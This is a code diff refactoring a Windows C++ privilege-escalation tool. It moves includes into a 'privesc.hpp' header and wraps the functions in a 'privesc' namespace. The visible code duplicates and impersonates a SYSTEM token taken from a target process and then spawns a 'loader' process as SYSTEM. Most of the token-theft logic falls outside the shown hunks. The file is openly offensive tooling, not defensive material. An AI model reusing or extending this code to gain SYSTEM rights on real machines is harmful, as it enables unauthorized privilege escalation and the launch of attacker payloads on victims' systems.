@@ -1,19 +1,10 @@
-#ifndef UNICODE
-#define UNICODE
-#endif 
-
-#include <Windows.h>
-#include <vector>
-#include <string>
-#include <memory>
-#include <iostream>
-#include <TlHelp32.h>
+#include "privesc.hpp"
 
 int wmain() {
 	HANDLE hDuplicateToken = NULL;
 	std::unique_ptr<void, decltype(&CloseHandle)> uphDuplicateToken(static_cast<void*>(hDuplicateToken), CloseHandle);
 
-	int err = SystemToken(&hDuplicateToken);
+	int err = privesc::SystemToken(&hDuplicateToken);
 	if (err != 0) {
 		std::wcout << L"system token impersonation failed with error " << err << std::endl;
 	}
@@ -40,7 +31,11 @@ int wmain() {
 	)) {
 		std::wcout << L"spawning loader as system failed" << std::endl;
 	}
+
+	return 0;
 }
+
+namespace privesc {
 
 int ImpersonateToken(DWORD dwPID, HANDLE* hNewToken) {
 
@@ -104,4 +99,5 @@ int SystemToken(HANDLE* hNewToken) {
 
 	// impersonate system token
 	return ImpersonateToken(dwTarget, hNewToken);
+}
 }
